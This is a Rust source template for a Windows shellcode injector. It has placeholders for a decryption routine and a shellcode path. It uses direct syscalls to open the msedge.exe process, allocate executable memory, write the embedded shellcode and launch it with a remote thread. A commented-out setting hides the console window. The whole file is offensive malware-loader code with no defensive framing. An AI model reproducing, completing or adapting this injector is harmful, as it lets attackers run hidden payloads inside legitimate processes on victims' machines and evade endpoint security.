//#![windows_subsystem = "windows"]
// TODO: remove all debug info

use std::include_bytes;
use std::{ptr::null_mut};
use freshycalls_syswhispers::{self, syscall, syscall_resolve::get_process_id_by_name};
use ntapi::{
    ntapi_base::CLIENT_ID,
};
use winapi::{
    um::{
        errhandlingapi::GetLastError,
        winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE, MEM_RESERVE, MAXIMUM_ALLOWED},
        lmaccess::{ACCESS_ALL}
    },
    shared::{
        ntdef::{OBJECT_ATTRIBUTES, HANDLE, NT_SUCCESS}
    }
};
use ntapi::winapi::ctypes::c_void;
use ntapi::ntpsapi::NtCreateThreadEx;

{{IMPORTS}}

{{DECRYPTION_FUNCTION}}


fn enhance(mut buf: Vec<u8>, tar:usize) {
    // injecting in target processes :)
    let mut process_handle = tar as HANDLE;
    let mut oa = OBJECT_ATTRIBUTES::default();
    let mut ci = CLIENT_ID {
        UniqueProcess: process_handle,
        UniqueThread: null_mut(),
    };

    unsafe {
        let open_status = syscall!(
            "NtOpenProcess",
            &mut process_handle,
            ACCESS_ALL,
            &mut oa,
            &mut ci
        );
        if !NT_SUCCESS(open_status) {
            panic!("Error opening process: {}", open_status);
        }

        let mut allocstart : *mut c_void = null_mut();
        let mut size : usize = buf.len();
        let alloc_status = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut allocstart,
            0,
            &mut size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_EXECUTE_READWRITE
        );
        if !NT_SUCCESS(alloc_status) {
            panic!("Error allocating  memory to the target process: {}", alloc_status);
        }
        let mut bytes_written = 0;
        let buffer = buf.as_mut_ptr() as *mut c_void;
        let buffer_length = buf.len();

        let write_status = syscall!(
            "NtWriteVirtualMemory", 
            process_handle,
            allocstart,
            buffer,
            buffer_length,
            &mut bytes_written
        );
        if !NT_SUCCESS(write_status) {
            panic!("Error writing shellcode to memory of the target process: {}", write_status);
        }

        let mut thread_handle : *mut c_void = null_mut();
        let handle = process_handle as *mut c_void;
        let lol: *mut c_void = null_mut();
        /* 
        let write_thread = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            MAXIMUM_ALLOWED, 
            lol,
            handle,
            allocstart, 
            lol,
            0, 
            0, 
            0, 
            0, 
            lol
        );
        */
        let write_thread = NtCreateThreadEx(&mut thread_handle, MAXIMUM_ALLOWED, null_mut(), handle, allocstart, null_mut(), 0, 0, 0, 0, null_mut());
        if !NT_SUCCESS(write_thread) {
            let last_error = GetLastError();
            println!("{}", last_error);
            panic!("Error failed to create remote thread: {}", write_thread);
        }

    }
}

fn main() {
    // inject in the following processes:
    let tar: &str = "msedge.exe";

    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
    let mut vec: Vec<u8> = Vec::new();
    for i in buf.iter() {
        vec.push(*i);
    }
    let process_id = get_process_id_by_name(&tar);
    if process_id == 0 {
        panic!("[-] Unable to find a process.")
    } else {
        {{MAIN}}
        enhance(vec, process_id);
    }
}
